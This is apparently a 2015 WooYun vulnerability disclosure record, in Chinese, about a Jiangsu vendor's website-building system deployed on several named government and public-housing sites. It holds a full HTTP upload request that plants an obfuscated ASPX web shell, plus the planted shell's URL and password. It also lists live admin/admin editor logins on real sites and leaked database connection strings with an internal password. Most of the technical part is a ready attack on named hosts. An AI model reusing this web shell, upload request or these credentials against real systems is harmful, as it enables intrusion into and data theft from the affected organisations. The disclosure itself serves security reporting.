{"id": 34924, "wybug_id": "wooyun-2015-0105161", "wybug_title": "某政企建站系统通用型漏洞打包", "wybug_corp": "江苏瀚远科技股份有限公司", "wybug_author": "路人甲", "wybug_date": "2015-04-01 14:43", "wybug_open_date": "2015-05-16 14:44", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-01：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-05-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 1#mvc版本任意文件上传2#aspx版本编辑器弱口令3#部分aspx版本配置不当至目录浏览 详细说明：  江苏瀚远科技股份有限公司成立于2002年，股份公司设立于2009 年11 月。公司秉承“实现信息技术之价值”的经营理念，在当前信息科技技术迅速推动现代服务业发展的形势下，为客户提供IT综合解决方案及服务，成为现代信息服务业创新高科技企业。江苏瀚远科技股份有限公司在西安设有全资子公司——西安瀚恒信息科技有限公司。可百度关键字：技术支持:江苏瀚远科技股份有限公司1#mvc版本任意文件上传案例：官网：http://www.hanwintech.com独墅湖高教区学生宿舍网：http://hq.sipedi.cn苏州体育信息网：http://www.tyj.suzhou.gov.cn上海市嘉定区公共租赁住房运营有限公司：http://www.jdgzf.net嘉定区公共租赁住房网上业务平台：http://rent.jdgzf.net门户演示站点：http://58.211.42.171:9001运动苏州（APP案例）：http://website.tyj.suzhou.gov.cn瀚远OA（APP案例）：http://58.211.42.171:8099以下以官网http://www.hanwintech.com为例进行演示\n\nMVC框架POC\nPOST http://www.hanwintech.com/upload/Picture/?dir=image HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: multipart/form-data; boundary=---------------------------7df1e4264021cAccept-Encoding: gzip, deflateHost: www.hanwintech.comContent-Length: 327Connection: Keep-AlivePragma: no-cacheCookie: ASP.NET_SessionId=-----------------------------7df1e4264021cContent-Disposition: form-data; name=\"imgFile\"; filename=\"wooyun.aspx\"Content-Type: application/octet-stream<%@PAGE LANGUAGE=JSCRIPT%><%var PAY:String=Request[\"\\x61\\x62\\x63\\x64\"];eval(PAY,\"\\x75\\x6E\\x73\\x61\"+\"\\x66\\x65\");%>-----------------------------7df1e4264021c--\n\n\n一句话地址：http://www.hanwintech.com/Files/Temp/c7bdb2b8-27eb-428f-85aa-a49dfac8d1eb.aspx密码：abcd\n\n下面http://hq.sipedi.cn\nPOST http://hq.sipedi.cn/upload/Picture/?dir=image HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: multipart/form-data; boundary=---------------------------7df1e4264021cAccept-Encoding: gzip, deflateHost: hq.sipedi.cnContent-Length: 217Connection: Keep-AlivePragma: no-cacheCookie: ASP.NET_SessionId=-----------------------------7df1e4264021cContent-Disposition: form-data; name=\"imgFile\"; filename=\"wooyun.aspx\"Content-Type: application/octet-streamwooyun test-----------------------------7df1e4264021c--\n\n\n\n\n下面体育局http://www.tyj.suzhou.gov.cn\n\n\n\n下面上海市嘉定区公共租赁住房运营有限公司http://www.jdgzf.net\n\n\n\n其它就不传了，说说我是怎么发现这个poc的在上海市嘉定区公共租赁住房申请表（个人）注册里，存在很多个上传点http://rent.jdgzf.net/ApplyOut/Index比如\n\n因为部分不存在通用性，就不指出来了，希望能够对所有上传点进行检查   漏洞证明：  2#aspx版本编辑器弱口令首先要说一下，这个编辑器能正常运行与否与配置有关就像http://www.sssc.gov.cn/HLTISP_Talent/WebEditor/admin/login.aspx打不开，但文件存在http://www.sssc.gov.cn/HLTISP_Talent/WebEditor/从上面的目录里就可以看出来偷偷告诉大家，访问这个，居然看到数据库链接http://www.sssc.gov.cn/HLTISP_Talent/WebEditor/admin/\n\n页面上报的是500，抓包后可以看到这个\n�� 19:   </configSections>�� 20:   <connectionStrings>�� 21:     <add name=\"WorkflowConString\" connectionString=\"Data Source=192.168.3.13;Initial Catalog=kjfwzx;User ID=kjfwzx;Password=a123456;\" providerName=\"System.Data.SqlClient\" />�� 22:     <add name=\"SIPMEAConnectionString1\" connectionString=\"Data Source=192.168.155.225;Initial Catalog=SIPMEA;Persist Security Info=True;User ID=siprcp;MultipleActiveResultSets=False;Packet Size=4096;Application Name=&quot;Microsoft SQL Server Management Studio&quot;\" providerName=\"System.Data.SqlClient\"/>�� 23:     <add name=\"szwjm_eisConnectionString1\" connectionString=\"Data Source=192.168.155.225;Initial Catalog=szwjm_eis;Persist Security Info=True;User ID=sipeim;MultipleActiveResultSets=False;Packet Size=4096;Application Name=&quot;Microsoft SQL Server Management Studio&quot;\" providerName=\"System.Data.SqlClient\"/>\n 弱口令案例如下：http://www.ntqx.gov.cn/ntqxoa/WebEditor/admin/login.aspxadmin/admin\n\n\n\n目录遍历\n\nhttp://www.ipark-suzhou.com/SZ_IPARKManage/WebEditor/admin/login.aspxadmin/admin\n\nhttp://www.wgxj.suzhou.gov.cn/szwgweb//WebEditor/admin/login.aspx  admin/admin\n\nhttp://www.suzhougardens.cn/webeditor/admin/login.aspxadmin/admin\n\nhttp://www.sssc.gov.cn/HLTISP/WebEditor/admin/login.aspxadmin/admin\n\newebeditor的shell我就不传了，大家都懂的。3#部分aspx版本配置不当至目录浏览www.ntqx.gov.cn\n\nhttp://www.ipark-suzhou.com/SZ_IPARKManage/WebEditor/\n\nhttp://www.suzhougardens.cn/webeditor/\n\nhttp://www.sssc.gov.cn/HLTISP/WebEditor/\n\n配置不当导致目录浏览，这个只要知道目录结构就可以尝试越权访问页面了   修复方案：  修改服务配置修改编辑器弱口令检查上传点，增加过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}